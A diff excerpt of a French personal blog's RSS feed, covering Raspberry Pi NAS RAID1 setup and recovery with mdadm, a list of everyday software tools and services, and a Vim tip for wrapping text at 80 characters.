+Le RAID va se construire, ce que nous pouvons suivre ainsi :
+
+	cat /proc/mdstat
+
+
+[1]: Fichier /etc/rockpi-sata.conf
+
+    [fan]
+    # When the temperature is above lv0 (35&#39;C), the fan at 25% power,
+    # and lv1 at 50% power, lv2 at 75% power, lv3 at 100% power.
+    # When the temperature is below lv0, the fan is turned off.
+    # You can change these values if necessary.
+    lv0 = 35
+    lv1 = 40
+    lv2 = 45
+    lv3 = 50
+    [key]
+    # You can customize the function of the key, currently available functions are
+    # slider: oled display next page
+    # switch: fan turn on/off switch
+    # reboot, poweroff
+    # If you have any good suggestions for key functions, 
+    # please add an issue on https://rock.sh/rockpi-sata
+    click = slider
+    twice = switch
+    press = none
+    [time]
+    # twice: maximum time between double clicking (seconds)
+    # press: long press time (seconds)
+    twice = 0.7
+    press = 1.8
+    [slider]
+    # Whether the oled auto display next page and the time interval (seconds)
+    auto = true
+    time = 10
+    [oled]
+    # Whether rotate the text of oled 180 degrees, whether use Fahrenheit
+    rotate = false
+    f-temp = false	
+
+Tags: raspberry, linux
+
+## Restaurer les données du raid sur une autre machine
+
+Brancher le disque en usb sur un laptop, puis :
+
+	$ sudo mdadm --examine /dev/sdb1 
+	/dev/sdb1:
+	          Magic : a92b4efc
+	        Version : 1.2
+	    Feature Map : 0x1
+	     Array UUID : 3c2a5eff:d7455954:d77b1813:e27e8d72
+	           Name : raspberrypi:0
+	  Creation Time : Sat Feb  8 15:34:52 2020
+	     Raid Level : raid1
+	   Raid Devices : 2
+	
+	 Avail Dev Size : 976506928 (465.63 GiB 499.97 GB)
+	     Array Size : 488253440 (465.63 GiB 499.97 GB)
+	  Used Dev Size : 976506880 (465.63 GiB 499.97 GB)
+	    Data Offset : 264192 sectors
+	   Super Offset : 8 sectors
+	   Unused Space : before=264112 sectors, after=48 sectors
+	          State : clean
+	    Device UUID : 32d73af4:2948dafd:90cb7742:bfaa2b58
+	
+	Internal Bitmap : 8 sectors from superblock
+	    Update Time : Fri Dec 17 20:57:07 2021
+	  Bad Block Log : 512 entries available at offset 16 sectors
+	       Checksum : 61023788 - correct
+	         Events : 21788
+	
+	
+	   Device Role : Active device 0
+	   Array State : AA (&#39;A&#39; == active, &#39;.&#39; == missing, &#39;R&#39; == replacing)
+
+### Assemblage
+
+Je tente avec cette commande qui échoue.
+
+	$ sudo mdadm --assemble /dev/md0 /dev/sdb1
+	mdadm: /dev/sdb1 is busy - skipping
+
+Puis, assemblage automatique : Il existe déjà un RAID détecté dans /dev/md127.
+
+	$ sudo mdadm --detail --scan
+	INACTIVE-ARRAY /dev/md127 metadata=1.2 name=raspberrypi:0 UUID=3c2a5eff:d7455954:d77b1813:e27e8d72
+
+	$ cat /proc/mdstat 
+	Personalities : 
+	md127 : inactive sdb1[2](S)
+	      488253464 blocks super 1.2
+       
+	unused devices: &lt;none&gt;
+
+Mais impossible de monter le raid.
+
+	$ sudo mount /dev/md127 /mnt/nas/
+	mount: /mnt/nas: can&#39;t read superblock on /dev/md127.
+
+Donc je stoppe le raid /dev/md127 qui semble avoir été créé automatiquement. Et je lance une détection auto. Un nouveau /dev/md/raspberry devient dispo.
+
+	$ sudo mdadm --stop /dev/md127
+	mdadm: stopped /dev/md127
+	$ sudo  mdadm --assemble --scan
+	mdadm: /dev/md/raspberrypi:0 has been started with 1 drive (out of 2).
+
+Et cette fois-ci je peux monter le raid :
+
+	$ sudo mount /dev/md/raspberrypi\:0 /mnt/raid1</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/nas-maison-raspberry-pi4-quad-sata.txt</guid>
+  </item>
+<item>
+<pubDate>2021-11-18T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2021/11/18/4</category>
+  <title>Outils et services</title>
+  <link>http://3r1c.net/posts/outils-et-services.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>En ce milieu de 4ème semaine de **confinement**~, ...plus tard, je fais le point sur mon outillage quotidien et services en ligne.
+
+## Les installables
+### Texte
+- [Typora](https://typora.io) : Mon éditeur Markdown préféré
+- [Obsidian](https://obsidian.md/) : qui pourrait devenir mon éditeur préféré
+- [Pandoc](https://pandoc.org) : pour générer de magnifiques PDF
+- pdfunite : pour unifier plusieurs pdf
+### Navigation
+- [qutebrowser](https://qutebrowser.org/)
+- Firefox
+  - `about:config`
+    - `widget.non-native-theme.scrollbar.style: 4`
+    - `widget.non-native-theme.scrollbar.size.override: 12`
+#### Firefox Add-ons
+- [cookie-autodelete](https://addons.mozilla.org/en-US/firefox/addon/cookie-autodelete/)
+- [I still don&#39;t care about cookies](https://addons.mozilla.org/en-US/firefox/addon/istilldontcareaboutcookies/)
+- [ublock origin](https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/)
+### Desktop
+- [Flameshot](https://github.com/lupoDharkael/flameshot) : pour de superbes captures d&#39;écran
+- [pass](https://www.passwordstore.org) : the standard unix password manager
+- [vim](https://vim.org) : l&#39;éditeur incontournable
+- [Syncthing](https://syncthing.net/) : synchroniser mes fichiers, mais surtout pour radier g--gle drive. Couplé à un VPS et un Raspberry Pi + le
+[Quad Sata Hat](https://wiki.radxa.com/Dual_Quad_SATA_HAT). Vous obtenez une solution de stockage efficace et à bas prix.
+- [rsnapshot](https://rsnapshot.org/) :pour mes backups incrementaux
+- [rclone](https://rclone.org/) : pour mes sauvegardes en ligne
+- [gocryptfs](https://nuetzlich.net/gocryptfs/) : pour chiffrer mes backups et quelques infos sensibles
+- [Manjaro](https://manjaro.org) : OS favori pour mon laptop
+- [Debian](https://debian.org) : OS favori pour mes serveurs
+- [kali](https://kali.org) : OS favori pour mes pentests, Black Arch à étudier aussi :)
+
+
+## Les hébergés
+- [Photopea](https://www.photopea.com) : en remplacement de Photoshop
+- [Asciiflow](http://asciiflow.com/) : pour quelques schémas
+- [lucidpress](https://www.lucidpress.com) : en remplacement de Indesign
+
+## Le quotidien
+- [ncdu](https://dev.yorhel.nl/ncdu) : pour gérer mon espace disque</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/outils-et-services.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-07T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2023/11/07/2</category>
+  <title>Wrap Existing Text at 80 Characters in Vim</title>
+  <link>http://3r1c.net/posts/wrap-existing-test-at-80-char-in-vim.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Vous avez un bloc de text ou de code existant dans vim. Vous voulez le reformater sur maximum 80 caractères.
+```
+:set textwidth=80
+```
+Vous voudrez peut être cette config pour appliquer automatiquement la limite de 80 pour certain type de fichiers.
+```
+au BufRead,BufNewFile *.md setlocal textwidth=80
+```
+Sélectionner les lignes à reformater avec la touche v.
+```
+v
+```
+Refomater:
+```
+gq
+```
+Aide:
+```
+:h gq
+```</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/wrap-existing-test-at-80-char-in-vim.txt</guid>
+  </item>
+  </channel>
+</rss>
